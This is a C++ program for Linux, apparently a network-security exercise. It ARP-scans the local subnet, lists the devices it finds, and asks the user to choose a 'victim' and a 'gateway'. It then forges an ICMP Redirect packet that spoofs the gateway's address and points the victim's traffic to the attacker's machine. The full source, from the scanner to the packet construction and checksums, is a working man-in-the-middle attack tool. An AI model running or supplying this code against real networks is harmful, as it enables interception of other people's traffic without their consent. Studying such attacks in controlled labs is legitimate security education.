#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <thread>
#include <chrono>
#include <iomanip>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <ifaddrs.h>

using namespace std;

struct Device {
    string ip;
    string mac;
};

uint8_t self_mac[6];
struct in_addr self_ip;
int ifindex;


// 計算 Checksum (fixed: proper one's complement fold)
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    unsigned long sum = 0;
    for (; nbytes > 1; nbytes -= 2) {
        sum += *ptr++;
    }
    if (nbytes == 1) {
        sum += *(unsigned char*)ptr;
    }
    // FIX: was "sum += (sum >> 16) + (sum & 0xffff);" which double-counts.
    // Correct two-step fold:
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short calculate_checksum_safe(const void* data, int nbytes) {
    // Copy to aligned buffer first
    vector<uint8_t> buf(nbytes + 1, 0);
    memcpy(buf.data(), data, nbytes);
    return calculate_checksum((unsigned short*)buf.data(), nbytes);
}

// 取得本機 MAC 與 IP 資訊
bool get_local_info(const string& iface_name, uint8_t* mac, struct in_addr* ip, int* ifindex) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface_name.c_str(), IFNAMSIZ);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) return false;
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) return false;
    *ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;

    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) return false;
    *ifindex = ifr.ifr_ifindex;

    close(sock);
    return true;
}

// ARP SCANNING
vector<Device> scan_devices(const string& iface_name) {

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    // TIMEOUT
    struct timeval tv;
    tv.tv_sec = 2; tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

    string base_ip = inet_ntoa(self_ip);
    base_ip = base_ip.substr(0, base_ip.find_last_of('.') + 1);

    // 1. Send ARP Requests
    for (int i = 1; i < 255; i++) {
        string target_ip_str = base_ip + to_string(i);
        if (target_ip_str == inet_ntoa(self_ip)) continue;

        struct {
            struct ethhdr eth;
            struct ether_arp arp;
        } frame;

        memset(&frame, 0, sizeof(frame));
        memset(frame.eth.h_dest, 0xff, 6); // Broadcast
        memcpy(frame.eth.h_source, self_mac, 6);
        frame.eth.h_proto = htons(ETH_P_ARP);

        frame.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
        frame.arp.ea_hdr.ar_pro = htons(ETH_P_IP);
        frame.arp.ea_hdr.ar_hln = 6;
        frame.arp.ea_hdr.ar_pln = 4;
        frame.arp.ea_hdr.ar_op = htons(ARPOP_REQUEST);

        memcpy(frame.arp.arp_sha, self_mac, 6);
        memcpy(frame.arp.arp_spa, &self_ip, 4);
        struct in_addr tip;
        inet_aton(target_ip_str.c_str(), &tip);
        memcpy(frame.arp.arp_tpa, &tip, 4);

        struct sockaddr_ll saddr_ll = {0};
        saddr_ll.sll_ifindex = ifindex;
        saddr_ll.sll_halen = ETH_ALEN;
        memcpy(saddr_ll.sll_addr, frame.eth.h_dest, 6);

        sendto(sock, &frame, sizeof(frame), 0, (struct sockaddr*)&saddr_ll, sizeof(saddr_ll));
    }

    // 2. Listen for ARP Replies
    vector<Device> found;
    uint8_t buffer[1024];
    while (recv(sock, buffer, sizeof(buffer), 0) > 0) {
        struct ether_arp* arp_resp = (struct ether_arp*)(buffer + 14);
        if (ntohs(arp_resp->ea_hdr.ar_op) == ARPOP_REPLY) {
            char ip_buf[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp_resp->arp_spa, ip_buf, INET_ADDRSTRLEN);

            char mac_buf[18];
            sprintf(mac_buf, "%02x:%02x:%02x:%02x:%02x:%02x",
                    arp_resp->arp_sha[0], arp_resp->arp_sha[1], arp_resp->arp_sha[2],
                    arp_resp->arp_sha[3], arp_resp->arp_sha[4], arp_resp->arp_sha[5]);

            found.push_back({ip_buf, mac_buf});
        }
    }
    close(sock);
    return found;
}

void send_redirect(const string& victim_ip, const string& gateway_ip, const string& attacker_ip, const string& destination) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt failed!!!");
        return;
    }

    // --- Build the ICMP Redirect packet with correct paddings and checksums ---
    struct __attribute__((packed)) ICMP_Echo_Reply {
        uint8_t type;      // 0
        uint8_t code;      // 0
        uint16_t checksum;
        uint16_t id;
        uint16_t seq;
    };

    struct __attribute__((packed)) RedirectPacket {
        struct iphdr ip;         // Outer IP header
        struct icmphdr icmp;     // ICMP Redirect header
        struct iphdr inner_ip;   // Embedded IP header
        ICMP_Echo_Reply echo;    // Embedded ICMP Echo Reply
    } packet;

    memset(&packet, 0, sizeof(packet));

    // Outer IP Header
    packet.ip.version = 4;
    packet.ip.ihl = 5;
    packet.ip.tos = 0;
    packet.ip.tot_len = htons(sizeof(packet));
    packet.ip.id = htons(12345);
    packet.ip.frag_off = 0;
    packet.ip.ttl = 64;
    packet.ip.protocol = IPPROTO_ICMP;
    packet.ip.check = 0;
    packet.ip.saddr = inet_addr(gateway_ip.c_str());
    packet.ip.daddr = inet_addr(victim_ip.c_str());
    // Calculate outer IP checksum
    packet.ip.check = calculate_checksum_safe(&packet.ip, sizeof(struct iphdr));

    // ICMP Redirect Header
    packet.icmp.type = 5;   // Redirect
    packet.icmp.code = 1;   // Host
    packet.icmp.checksum = 0;
    packet.icmp.un.gateway = inet_addr(attacker_ip.c_str());

    // Embedded IP Header (original packet)
    packet.inner_ip.version = 4;
    packet.inner_ip.ihl = 5;
    packet.inner_ip.tos = 0;
    packet.inner_ip.tot_len = htons(sizeof(struct iphdr) + sizeof(ICMP_Echo_Reply));
    packet.inner_ip.id = htons(22486);
    packet.inner_ip.frag_off = 0;
    packet.inner_ip.ttl = 64;
    packet.inner_ip.protocol = IPPROTO_ICMP;
    packet.inner_ip.check = 0;
    packet.inner_ip.saddr = inet_addr(victim_ip.c_str());
    packet.inner_ip.daddr = inet_addr(destination.c_str());
    // Calculate inner IP checksum
    packet.inner_ip.check = calculate_checksum_safe(&packet.inner_ip, sizeof(struct iphdr));

    // Embedded ICMP Echo Reply
    packet.echo.type = 0; // Echo Reply
    packet.echo.code = 0;
    packet.echo.checksum = 0;
    packet.echo.id = 0;
    packet.echo.seq = 0;
    // Calculate checksum for embedded ICMP Echo Reply
    packet.echo.checksum = calculate_checksum_safe(&packet.echo, sizeof(ICMP_Echo_Reply));

    // Calculate ICMP Redirect checksum (header + embedded IP + embedded ICMP)
    // FIX: icmp_payload_len must include sizeof(struct icmphdr) as part of total,
    // and the checksum region starts at &packet.icmp and spans the full ICMP block.
    int icmp_total_len = sizeof(struct icmphdr) + sizeof(struct iphdr) + sizeof(ICMP_Echo_Reply);
    packet.icmp.checksum = calculate_checksum_safe(&packet.icmp, icmp_total_len);

    int packet_len = sizeof(packet);

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = packet.ip.daddr;

    if (sendto(sock, &packet, packet_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
        perror("sendto failed!!!");
    } else {
        cout << "ICMP Redirect packet sent to " << victim_ip << " successfully !" << endl;
    }

    close(sock);
    return;
}

int main(int argc, char* argv[]) {
    if (geteuid() != 0) {
        cerr << "Please run as root (sudo)." << endl;
        return 1;
    }

    string destination = argv[1];
    string iface = argv[2];

    if (!get_local_info(iface, self_mac, &self_ip, &ifindex)) return 0;

    vector<Device> devices = scan_devices(iface);
    string LINE = "---------------------------------------------";
    cout << LINE << endl;
    cout << left << setw(5) << "Index |" << setw(20) << "IP" << setw(20) << " | MAC" << endl;
    cout << LINE << endl;
    for (size_t i = 0; i < devices.size(); ++i) {
        cout << left << setw(5) << i << setw(20) << devices[i].ip << setw(20) << devices[i].mac << endl;
    }
    cout << LINE << endl;
    int v_idx, g_idx;
    cout << "Select Victim IP Index: "; cin >> v_idx;
    cout << "Select Gateway IP Index: "; cin >> g_idx;

    cout << "Victim IP: " << devices[v_idx].ip << ", Gateway IP: " << devices[g_idx].ip << ", Attacker IP: " << inet_ntoa(self_ip) << endl;

    send_redirect(devices[v_idx].ip, devices[g_idx].ip, inet_ntoa(self_ip), destination); // victim, gateway, attacker, destination

    return 0;
}